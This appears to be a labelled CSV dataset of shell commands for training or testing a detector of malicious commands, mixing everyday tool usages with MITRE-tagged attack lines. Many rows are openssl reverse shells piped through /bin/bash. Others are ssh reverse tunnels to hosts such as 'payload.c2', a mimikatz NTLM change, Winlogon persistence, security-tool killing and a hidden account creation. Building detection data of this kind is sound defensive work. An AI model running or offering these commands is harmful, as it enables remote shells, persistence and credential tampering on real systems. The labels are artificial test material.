command,label,original_label,mitre_id
ssh -R 8080:localhost:80 jenkins@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
xclock -digital -twelve -brief,Benign,Benign,Benign
LSADUMP::ChangeNTLM,Malicious,Malicious,T1098
gsutil ls,Benign,Benign,Benign
rbw unlock,Benign,Benign,Benign
ssh -R 4444:localhost:22 root@payload.c2,Context_Dependent,Synthetic,Synthetic
sudo cu [-l|--line] /dev/ttyXYZ [-s|--speed] 115200 --parity=even|odd|none [-f|--nortscts] --nostop,Benign,Benign,Benign
soupault --index-only --dump-index-json path/to/file.json,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
cmd.exe /c systeminfo,Context_Dependent,Malicious,T1082
ssh -fN -L 8080:10.0.0.100:22 root@10.0.0.50,Context_Dependent,Synthetic,Synthetic
imhex --version,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
gzip */*.txt,Benign,Benign,Benign
resolvectl --legend no [-t|--type] MX query domain,Benign,Benign,Benign
ssh -R 4444:localhost:995 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
reg add key_name /v value,Benign,Benign,Benign
su -c /bin/sh,Malicious,Malicious,T1059
"tea issues create --title ""title"" --body ""body""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 deploy@internal.corp,Context_Dependent,Synthetic,Synthetic
idea inspect path/to/project_directory path/to/inspection_profile path/to/output,Benign,Benign,Benign
lsscsi,Benign,Benign,Benign
uncompress -c path/to/file1.Z path/to/file2.Z ...,Benign,Benign,Benign
kubectl wait --for condition=complete job/job_name --timeout 120s,Benign,Benign,Benign
setfont font.gz,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
autoexpect -f path/to/file command,Benign,Benign,Benign
ssh -R 8080:localhost:8888 user@172.16.5.20,Context_Dependent,Synthetic,Synthetic
sudo wpa_cli scan,Benign,Benign,Benign
sqlite-utils create-database path/to/database.db,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
wapm install --global package,Benign,Benign,Benign
zapier history,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:1433 operator@192.168.1.1,Context_Dependent,Synthetic,Synthetic
dotenvx get,Benign,Benign,Benign
ssh -R 4444:localhost:143 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
newrole [-r|--role] role_name [-t|--type] type_name,Benign,Benign,Benign
ssh -R 4444:localhost:6379 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
split -C 100m -d data.tsv data.tsv.,Benign,Benign,Benign
"{(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}",Malicious,Malicious,T1552
phpcs path/to/directory,Benign,Benign,Benign
drupal module:install module_name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
lzip [-d|--decompress] [-k|--keep] path/to/archive.lz,Benign,Benign,Benign
ssh -R 8080:localhost:80 root@172.16.5.20,Context_Dependent,Synthetic,Synthetic
shred -u $file_to_shred,Malicious,Malicious,T1070
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:993 operator@10.0.0.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
sudo machinectl shell machine_name,Benign,Benign,Benign
makepkg [-so|--syncdeps --nobuild],Benign,Benign,Benign
sudo tlp-stat [-t|--temp],Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 support@192.168.1.10,Context_Dependent,Synthetic,Synthetic
head path/to/file1 path/to/file2 ...,Benign,Benign,Benign
electrum signmessage address message,Benign,Benign,Benign
"find $FOLDER -name "".*""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:3306,Malicious,Synthetic,Synthetic
you-get [-i|--info] https://example.com/video?id=value,Benign,Benign,Benign
find . -name test -type d -exec rm -r {} \;,Benign,Benign,Benign
eol product [-w|--web],Benign,Benign,Benign
blkdiscard [-l|--length] 100MB /dev/device,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8443,Malicious,Synthetic,Synthetic
find /opt -mtime +30 -mtime -50,Benign,Benign,Benign
gdaldem aspect path/to/input.tif path/to/output.tif,Benign,Benign,Benign
gpg [-k|--list-keys],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
"find /dir \( -name foo -prune \) -o \( -name bar -prune \) -o -name ""*.sh"" -print",Benign,Benign,Benign
"find / -type f -size +20000k -exec ls -lh {} \; 2> /dev/null | awk '{ print $NF "": "" $5 }' | sort -nrk 2,2",Context_Dependent,Benign,Benign
ssh -R 4444:localhost:8080 operator@10.10.10.10,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:80 jenkins@10.10.10.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
aws s3 mb s3://bucket_name,Benign,Benign,Benign
gemtopnm path/to/file.img > path/to/output.pnm,Benign,Benign,Benign
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force",Malicious,Malicious,T1547
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
ntfyme config,Benign,Benign,Benign
command -1 <(gzip -dc file1.gz) -2 <(gzip -dc file2.gz),Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
msgfmt [-h|--help],Benign,Benign,Benign
rc-status [-c|--crashed],Benign,Benign,Benign
sudo tlmgr remove package,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
kaggle [d|datasets] metadata dataset_name,Benign,Benign,Benign
Set-PSReadLineOption -HistorySavePath {File Path},Malicious,Malicious,T1562
stress [-i|--io] 2 [-t|--timeout] 5,Benign,Benign,Benign
mmdc [-i|--input] input.mmd [-o|--output] output.svg [-b|--backgroundColor] color,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
duc ui /usr,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:53 deploy@10.10.10.10,Context_Dependent,Synthetic,Synthetic
"sudo ln -f ""findpdftext"" /usr/local/bin",Benign,Benign,Benign
unrtf path/to/file.rtf,Benign,Benign,Benign
ssh -R 8080:localhost:1433 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
mstsc.exe /v:{hostname/ip},Malicious,Malicious,T1021
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
find . ( -name '*.bak' -o -name *.backup ) -type f -atime +30 -exec rm '{}' ;,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9002,Malicious,Synthetic,Synthetic
jest --watch,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
sshare,Benign,Benign,Benign
ssh -L 8080:localhost:9001 svcuser@evil.com,Context_Dependent,Synthetic,Synthetic
ldapdomaindump [-u|--user] domain\username [-p|--password] password|ntlm_hash hostname|ip,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
pw-metadata [-d|--delete],Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
GetADUsers.py -all -dc-ip domain_controller_ip -hashes LM_Hash:NT_Hash domain/username,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:8081,Malicious,Synthetic,Synthetic
git switch branch_name,Benign,Benign,Benign
fmt [-u|--uniform-spacing] path/to/file,Benign,Benign,Benign
xh post https://postman-echo.com/post name=john age=25,Benign,Benign,Benign
"tac a.csv | sort -u -t, -r -k1,1 |tac",Benign,Benign,Benign
sort path/to/file | uniq [-s|--skip-chars] 5,Benign,Benign,Benign
ssh -R 4444:localhost:80 deploy@192.168.1.254,Context_Dependent,Synthetic,Synthetic
ls *.txt | parallel [-j|--jobs] 4 gzip,Benign,Benign,Benign
cat $i | wc -l,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
find . -name 'cache*' -depth -exec rm {} \;,Benign,Benign,Benign
gradle :subproject:clean,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"b=`echo ""$a"" | awk '{ print toupper($1) }'`",Benign,Benign,Benign
sudo su,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
tar -cvzf $output_file $input_file_folder,Malicious,Malicious,T1560
more path/to/file,Benign,Benign,Benign
az tag remove-value [-n|--name] tag_name --value tag_value,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
cradle deploy s3,Benign,Benign,Benign
adb forward --remove tcp:local_port,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
py-spy top [-p|--pid] pid,Benign,Benign,Benign
ssh -R 4444:localhost:22 root@192.168.0.5,Context_Dependent,Synthetic,Synthetic
prettier --config path/to/config_file path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
tldr [-p|--platform] linux fold,Benign,Benign,Benign
ybacklight d300,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
xcopy path\to\file_or_directory path\to\destination_directory /z,Benign,Benign,Benign
syncthing --log-level info|warning|error|debug,Benign,Benign,Benign
ssh -R 4444:localhost:1433 admin@10.0.0.5,Context_Dependent,Synthetic,Synthetic
mips_ff,Malicious,Malicious,T1562
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
"FOLDERS=$(find . -type d -print0 | tr '\0' ',')",Benign,Benign,Benign
mh_metric --octave path/to/file1.m path/to/file2.m ...,Benign,Benign,Benign
expac [-S|--sync] '%D' package,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
nltest,Context_Dependent,Malicious,T1016
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
pw useradd $username -s /usr/sbin/nologin -d /nonexistent -c evil_account,Malicious,Malicious,T1136
ssh -R 4444:localhost:6379 admin@files.company.local,Context_Dependent,Synthetic,Synthetic
authconfig --update --passalgo=algorithm,Benign,Benign,Benign
pv path/to/file | sha256sum,Benign,Benign,Benign
kubectl apply view-last-applied [-f|--filename] path/to/file,Benign,Benign,Benign
ssh -R 4444:localhost:22 root@10.0.0.10,Context_Dependent,Synthetic,Synthetic
ip [r|route] [g|get] destination from source,Benign,Benign,Benign
ssh -R 8080:localhost:993 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
float variable_name=value,Benign,Benign,Benign
calcurse-caldav --init=keep-local,Benign,Benign,Benign
xo --space,Benign,Benign,Benign
ghcid --height=height --width=width path/to/Main.hs,Benign,Benign,Benign
"& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n $process_name",Malicious,Malicious,T1562
rankmirrors [-v|--verbose] /etc/pacman.d/mirrorlist,Benign,Benign,Benign
errno [-l|--list],Benign,Benign,Benign
"mount | tail -1 | sed -e ""s/^[^/]*\(.*\) type .*$/\1/g""",Context_Dependent,Benign,Benign
sudo find . -type d -exec chmod 755 {} +,Benign,Benign,Benign
ssh -R 4444:localhost:4444 backup@10.0.0.8,Context_Dependent,Synthetic,Synthetic
find . -maxdepth 1 -cmin +60 -name file,Benign,Benign,Benign
pg_recvlogical [-d|--dbname] dbname [-S|--slot] slot_name --start [-f|--file] filename,Benign,Benign,Benign
polybar --reload bar_name,Benign,Benign,Benign
"find . -iname '*.jpg' | while read fn; do name=$(basename ""$fn"") ; dir=$(dirname ""$fn"") ; mv ""$fn"" ""$dir/$(basename ""$dir"")-$name"" ;done ./lib/bukovina/version.jpg ./lib/bukovina/bukovina-version.jpg",Benign,Benign,Benign
fisher plugin1 plugin2,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
rsync -pogtEtvr --progress --bwlimit=2000 xxx-files different-stuff,Benign,Benign,Benign
idevicebackup2 list,Benign,Benign,Benign
pixterm -s 2 path/to/file,Benign,Benign,Benign
reload in n,Benign,Benign,Benign
john --restore=path/to/mycrack.rec,Benign,Benign,Benign
xfce4-screenshooter [-w|--window] [-c|--clipboard],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"find . -print0 | xargs -0 -l -i echo ""{}"";",Benign,Benign,Benign
ppmchange [-r|-remainder] color oldcolor1 newcolor1 oldcolor2 newcolor2 ... path/to/input.ppm > path/to/output.ppm,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
git maintenance start,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
